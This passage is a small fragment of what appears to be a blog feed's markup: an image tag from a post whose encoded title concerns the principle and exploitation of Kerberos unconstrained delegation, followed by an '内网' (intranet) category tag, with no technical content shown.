+<img data-src="/2022/03/15/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/image-20220316174621620.png" class title="image-20220316174621620">
 ]]></content>
       <categories>
         <category>内网</category>
